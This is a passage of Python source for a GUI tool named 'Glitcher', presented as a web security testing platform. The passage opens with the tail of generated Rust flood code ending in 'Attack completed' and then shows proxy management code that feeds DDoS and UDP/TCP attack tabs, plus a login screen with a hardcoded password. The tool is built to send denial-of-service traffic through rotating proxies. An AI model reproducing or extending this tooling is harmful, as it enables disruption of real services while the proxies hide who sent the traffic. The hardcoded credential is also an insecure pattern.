                    Err(_) => ({{}}), // Error, continue
                }}
                
                // Small delay to prevent overwhelming the system
                sleep(Duration::from_millis(10)).await;
            }}
        }});
        
        handles.push(handle);
    }}
    
    // Wait for the specified duration
    sleep(duration).await;
    
    // Cancel all tasks
    for handle in handles {{
        handle.abort();
    }}
    
    println!(\"Attack completed\");
    Ok(())
}}
"""
        else:
            code = f"""// Rust code for {functionality} on {target_url}
// Generated by Glitch-Burp-V2

fn main() {{
    println!(\"{functionality} functionality for {target_url}\n    
    // Add your Rust implementation here
}}
"""
        
        return code
    
    def create_proxy_management_ui(self):
        # Main frame for proxy management
        proxy_main_frame = ttk.LabelFrame(self.proxy_management_frame, text="Proxy Management - Check and Manage Proxies", padding=10)
        proxy_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Controls frame
        controls_frame = ttk.LabelFrame(proxy_main_frame, text="Proxy Management", padding=10)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Enable/Disable All button
        toggle_all_frame = ttk.Frame(controls_frame)
        toggle_all_frame.pack(fill=tk.X, pady=5)
        
        self.enable_all_proxies_btn = ttk.Button(toggle_all_frame, text="Enable All Proxies", command=self.toggle_all_proxies)
        self.enable_all_proxies_btn.pack(side=tk.LEFT, padx=5)
        
        # Buttons
        button_frame = ttk.Frame(controls_frame)
        button_frame.pack(fill=tk.X, pady=5)
        
        self.load_proxies_btn = ttk.Button(button_frame, text="Load Proxies from File", command=self.load_proxies_from_file)
        self.load_proxies_btn.pack(side=tk.LEFT, padx=5)
        
        self.check_proxies_btn = ttk.Button(button_frame, text="Check All Proxies", command=self.check_all_proxies, state=tk.DISABLED)
        self.check_proxies_btn.pack(side=tk.LEFT, padx=5)
        
        self.test_proxy_btn = ttk.Button(button_frame, text="Test Single Proxy", command=self.test_single_proxy)
        self.test_proxy_btn.pack(side=tk.LEFT, padx=5)
        
        # Add proxy frame
        add_proxy_frame = ttk.Frame(controls_frame)
        add_proxy_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(add_proxy_frame, text="Add Proxy (IP:PORT):", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        self.new_proxy_var = tk.StringVar()
        self.new_proxy_entry = ttk.Entry(add_proxy_frame, textvariable=self.new_proxy_var, width=20, font=("Arial", 10))
        self.new_proxy_entry.pack(side=tk.LEFT, padx=(0, 10))
        
        self.add_proxy_btn = ttk.Button(add_proxy_frame, text="Add Proxy", command=self.add_proxy)
        self.add_proxy_btn.pack(side=tk.LEFT)
        
        # Proxy list frame
        proxy_list_frame = ttk.LabelFrame(proxy_main_frame, text="Proxy List", padding=10)
        proxy_list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Proxy treeview
        columns = ("IP", "Port", "Status", "Response Time", "Last Checked", "Enabled")
        self.proxy_tree = ttk.Treeview(proxy_list_frame, columns=columns, show='headings', height=20)
        
        # Define headings
        for col in columns:
            self.proxy_tree.heading(col, text=col)
            self.proxy_tree.column(col, width=100)
        
        # Set specific width for the enabled column
        self.proxy_tree.column("Enabled", width=60)
        
        # Scrollbars
        v_scrollbar = ttk.Scrollbar(proxy_list_frame, orient=tk.VERTICAL, command=self.proxy_tree.yview)
        h_scrollbar = ttk.Scrollbar(proxy_list_frame, orient=tk.HORIZONTAL, command=self.proxy_tree.xview)
        self.proxy_tree.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        # Pack elements
        self.proxy_tree.grid(row=0, column=0, sticky='nsew')
        v_scrollbar.grid(row=0, column=1, sticky='ns')
        h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        # Bind double-click to toggle individual proxy
        self.proxy_tree.bind('<Double-1>', self.toggle_individual_proxy)
        
        proxy_list_frame.grid_rowconfigure(0, weight=1)
        proxy_list_frame.grid_columnconfigure(0, weight=1)
        
        # Initialize proxy list
        self.proxies = []
        self.load_existing_proxies()
    
    def load_existing_proxies(self):
        # Load proxies from proxies.txt file
        try:
            with open('proxies.txt', 'r', encoding='utf-8-sig') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':')
                        if len(parts) == 2:
                            ip, port = parts
                            self.proxies.append({
                                'ip': ip,
                                'port': port,
                                'status': 'Unknown',
                                'response_time': 'N/A',
                                'last_checked': 'Never',
                                'enabled': False  # Initially disabled
                            })
        except FileNotFoundError:
            # If file doesn't exist, create it
            with open('proxies.txt', 'w', encoding='utf-8') as f:
                f.write('# Glitcher Proxies File\n')
                f.write('# Add your proxies in IP:PORT format\n')
                f.write('# Example: 127.0.0.1:8080\n')
        except UnicodeDecodeError:
            # If UTF-8 fails, try with latin-1
            try:
                with open('proxies.txt', 'r', encoding='latin-1') as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line:
                            parts = line.split(':')
                            if len(parts) == 2:
                                ip, port = parts
                                self.proxies.append({
                                    'ip': ip,
                                    'port': port,
                                    'status': 'Unknown',
                                    'response_time': 'N/A',
                                    'last_checked': 'Never',
                                    'enabled': False  # Initially disabled
                                })
            except:
                # If all encodings fail, create empty file
                with open('proxies.txt', 'w', encoding='utf-8') as f:
                    f.write('# Glitcher Proxies File\n')
                    f.write('# Add your proxies in IP:PORT format\n')
                    f.write('# Example: 127.0.0.1:8080\n')
        
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies (use a longer delay to avoid UI freezing)
        self.root.after(250, self.update_ddos_proxy_list)
        self.root.after(250, self.update_udp_tcp_proxy_list)
    
    def load_proxies_from_file(self):
        # Load proxies from file and display them
        self.proxies = []  # Clear existing list
        self.load_existing_proxies()
        self.check_proxies_btn.config(state=tk.NORMAL)
        messagebox.showinfo("Success", f"Loaded {len(self.proxies)} proxies from proxies.txt")
    
    def update_proxy_list(self):
        # Clear existing items
        for item in self.proxy_tree.get_children():
            self.proxy_tree.delete(item)
        
        # Add proxies to treeview
        for proxy in self.proxies:
            enabled_status = "Yes" if proxy['enabled'] else "No"
            # Color code based on status
            if proxy['status'] == 'Online':
                # Add online proxies with green status
                self.proxy_tree.insert('', tk.END, values=(
                    proxy['ip'],
                    proxy['port'],
                    proxy['status'],
                    proxy['response_time'],
                    proxy['last_checked'],
                    enabled_status
                ), tags=('online',))
            elif proxy['status'] == 'Offline':
                # Add offline proxies with red status
                self.proxy_tree.insert('', tk.END, values=(
                    proxy['ip'],
                    proxy['port'],
                    proxy['status'],
                    proxy['response_time'],
                    proxy['last_checked'],
                    enabled_status
                ), tags=('offline',))
            else:
                # Add unknown status proxies
                self.proxy_tree.insert('', tk.END, values=(
                    proxy['ip'],
                    proxy['port'],
                    proxy['status'],
                    proxy['response_time'],
                    proxy['last_checked'],
                    enabled_status
                ), tags=('unknown',))
        
        # Configure tags for different statuses
        self.proxy_tree.tag_configure('online', background='#d4edda', foreground='green')
        self.proxy_tree.tag_configure('offline', background='#f8d7da', foreground='red')
        self.proxy_tree.tag_configure('unknown', background='#fff3cd', foreground='orange')
    
    def toggle_all_proxies(self):
        # Toggle all proxies (enable/disable all)
        all_enabled = all(proxy['enabled'] for proxy in self.proxies)
        
        # If all are enabled, disable all; otherwise enable all
        new_state = not all_enabled
        
        for proxy in self.proxies:
            proxy['enabled'] = new_state
        
        # Update the button text
        if new_state:
            self.enable_all_proxies_btn.config(text="Disable All Proxies")
        else:
            self.enable_all_proxies_btn.config(text="Enable All Proxies")
        
        # Update the list
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(250, self.update_ddos_proxy_list)
        self.root.after(250, self.update_udp_tcp_proxy_list)
        
        # Update proxy status in other tabs
        if hasattr(self, 'ddos_proxy_status_label'):
            self.update_ddos_proxy_status()
            # Skip duplicate update since it's already scheduled above
        if hasattr(self, 'udp_tcp_proxy_status_label'):
            self.update_udp_tcp_proxy_status()
    
    def toggle_individual_proxy(self, event):
        # Toggle individual proxy when double-clicked
        selected_item = self.proxy_tree.selection()
        if not selected_item:
            return
        
        # Get the selected item's values
        item_values = self.proxy_tree.item(selected_item[0], 'values')
        ip, port = item_values[0], item_values[1]
        
        # Find the proxy in the list and toggle its state
        for proxy in self.proxies:
            if proxy['ip'] == ip and proxy['port'] == port:
                proxy['enabled'] = not proxy['enabled']
                break
        
        # Update the list
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(250, self.update_ddos_proxy_list)
        self.root.after(250, self.update_udp_tcp_proxy_list)
        
        # Update proxy status in other tabs
        if hasattr(self, 'ddos_proxy_status_label'):
            self.update_ddos_proxy_status()
            # Skip duplicate update since it's already scheduled above
        if hasattr(self, 'udp_tcp_proxy_status_label'):
            self.update_udp_tcp_proxy_status()
    
    def get_enabled_proxies(self):
        # Return list of enabled proxies
        if not hasattr(self, 'proxies'):
            return []
        return [proxy for proxy in self.proxies if proxy['enabled']]
    
    def add_proxy(self):
        proxy_input = self.new_proxy_var.get().strip()
        if not proxy_input:
            messagebox.showwarning("Warning", "Please enter a proxy in IP:PORT format")
            return
        
        if ':' not in proxy_input:
            messagebox.showerror("Error", "Invalid format. Please use IP:PORT format")
            return
        
        parts = proxy_input.split(':')
        if len(parts) != 2:
            messagebox.showerror("Error", "Invalid format. Please use IP:PORT format")
            return
        
        ip, port = parts
        try:
            port_num = int(port)
            if not (1 <= port_num <= 65535):
                raise ValueError("Port out of range")
        except ValueError:
            messagebox.showerror("Error", "Invalid port number. Must be between 1 and 65535")
            return
        
        # Check if proxy already exists
        for proxy in self.proxies:
            if proxy['ip'] == ip and proxy['port'] == port:
                messagebox.showwarning("Warning", "Proxy already exists in the list")
                return
        
        # Add proxy to list
        self.proxies.append({
            'ip': ip,
            'port': port,
            'status': 'Unknown',
            'response_time': 'N/A',
            'last_checked': 'Never',
            'enabled': False  # New proxies start as disabled
        })
        
        # Add to file
        with open('proxies.txt', 'a') as f:
            f.write(f"{proxy_input}\n")
        
        # Update UI
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(100, self.update_ddos_proxy_list)
        self.root.after(100, self.update_udp_tcp_proxy_list)
        self.new_proxy_var.set('')
        self.check_proxies_btn.config(state=tk.NORMAL)
        
        # Update proxy status in other tabs
        if hasattr(self, 'ddos_proxy_status_label'):
            self.update_ddos_proxy_status()
            # Skip duplicate update since it's already scheduled above
        if hasattr(self, 'udp_tcp_proxy_status_label'):
            self.update_udp_tcp_proxy_status()
        
        messagebox.showinfo("Success", f"Added proxy {proxy_input} to the list")
    
    def test_single_proxy(self):
        # Get selected proxy from treeview
        selected_item = self.proxy_tree.selection()
        if not selected_item:
            messagebox.showwarning("Warning", "Please select a proxy to test")
            return
        
        item_values = self.proxy_tree.item(selected_item[0], 'values')
        ip, port = item_values[0], item_values[1]
        
        # Test the proxy
        status, response_time = self.check_proxy_connection(ip, port)
        
        # Update proxy info
        for proxy in self.proxies:
            if proxy['ip'] == ip and proxy['port'] == port:
                proxy['status'] = status
                proxy['response_time'] = f"{response_time}ms" if response_time != 'N/A' else 'N/A'
                proxy['last_checked'] = time.strftime('%H:%M:%S')
                break
        
        # Update UI
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(250, self.update_ddos_proxy_list)
        self.root.after(250, self.update_udp_tcp_proxy_list)
        messagebox.showinfo("Test Result", f"Proxy {ip}:{port} - Status: {status}")
    
    def check_all_proxies(self):
        # Disable button during check
        self.check_proxies_btn.config(state=tk.DISABLED)
        
        # Start checking in a separate thread
        threading.Thread(target=self._check_all_proxies_thread, daemon=True).start()
    
    def _check_all_proxies_thread(self):
        total_proxies = len(self.proxies)
        for i, proxy in enumerate(self.proxies):
            status, response_time = self.check_proxy_connection(proxy['ip'], proxy['port'])
            
            # Update proxy info
            proxy['status'] = status
            proxy['response_time'] = f"{response_time}ms" if response_time != 'N/A' else 'N/A'
            proxy['last_checked'] = time.strftime('%H:%M:%S')
            
            # Update UI in main thread
            self.root.after(0, lambda: self.update_proxy_list())
            
            # Update progress
            progress = f"Checking proxies: {i+1}/{total_proxies}"
            self.root.after(0, lambda p=progress: self.root.title(p))
        
        # Re-enable button
        self.root.after(0, lambda: self.check_proxies_btn.config(state=tk.NORMAL))
        self.root.after(0, lambda: self.root.title("Glitcher - Professional Web Security Testing Platform"))
        self.root.after(0, lambda: messagebox.showinfo("Complete", "Proxy checking completed"))
    
    def check_proxy_connection(self, ip, port):
        import socket
        import time
        
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # 5 second timeout
            
            start_time = time.time()
            result = sock.connect_ex((ip, int(port)))
            end_time = time.time()
            
            response_time = round((end_time - start_time) * 1000, 2)  # Convert to milliseconds
            
            sock.close()
            
            if result == 0:
                return 'Online', response_time
            else:
                return 'Offline', 'N/A'
        except Exception as e:
            return 'Offline', 'N/A'

def show_login():
    login_window = tk.Tk()
    login_window.title("Glitcher - Login 2FA AUTOMATIC")
    login_window.geometry("1280x720")
    login_window.resizable(False, False)
    
    # Try to load and display the login image
    try:
        from PIL import Image, ImageTk
        image_path = "templates/login.png"
        image = Image.open(image_path)
        # Resize image to fit window if needed
        image = image.resize((1280, 720), Image.Resampling.LANCZOS)
        photo = ImageTk.PhotoImage(image)
        
        # Create label to display image
        image_label = tk.Label(login_window, image=photo)
        image_label.image = photo  # Keep a reference to avoid garbage collection
        image_label.pack()
        
        # Create a frame for the login area in the bottom-right corner
        login_frame = tk.Frame(login_window, bg='black', padx=30, pady=30)
        login_frame.place(relx=1.0, rely=1.0, anchor='se')  # Place at bottom-right
        
        # Login label and entry
        tk.Label(login_frame, text="Login", bg='black', fg='white', font=("Arial", 16, "bold")).pack(pady=(0, 10))
        
        tk.Label(login_frame, text="Password:", bg='black', fg='white', font=("Arial", 12)).pack(pady=(0, 5))
        
        password_var = tk.StringVar()
        password_entry = tk.Entry(login_frame, textvariable=password_var, show="*", font=("Arial", 12), width=25)
        password_entry.pack(pady=(0, 10))
        
        def check_password():
            if password_var.get() == "godveaq":
                login_window.destroy()
                show_main_app()
            else:
                messagebox.showerror("Error", "Invalid password")
        
        # Login button
        login_button = tk.Button(login_frame, text="Login", command=check_password, font=("Arial", 12), bg="#2563eb", fg="white")
        login_button.pack()
        
        # Bind Enter key to login
        password_entry.bind('<Return>', lambda event: check_password())
        
    except ImportError:
        # PIL not available, use a simple login form
        tk.Label(login_window, text="GLITCHER", font=("Arial", 24, "bold")).pack(pady=50)
        tk.Label(login_window, text="Enter Password:", font=("Arial", 14)).pack(pady=10)
        
        password_var = tk.StringVar()
        password_entry = tk.Entry(login_window, textvariable=password_var, show="*", font=("Arial", 14), width=25)
        password_entry.pack(pady=10)
        
        def check_password():
            if password_var.get() == "godveaq":
                login_window.destroy()
                show_main_app()
            else:
                messagebox.showerror("Error", "Invalid password")
        
        tk.Button(login_window, text="Login", command=check_password, font=("Arial", 14)).pack(pady=20)
        password_entry.bind('<Return>', lambda event: check_password())
        
        # Focus on password entry
        password_entry.focus()
    
    login_window.mainloop()

def show_main_app():
    root = tk.Tk()
    
    # Configure styles
    style = ttk.Style()
    style.configure('Danger.TButton', foreground='red')
    
    app = GlitcherGUI(root)
    root.mainloop()

def main():
    show_login()

if __name__ == "__main__":
    main()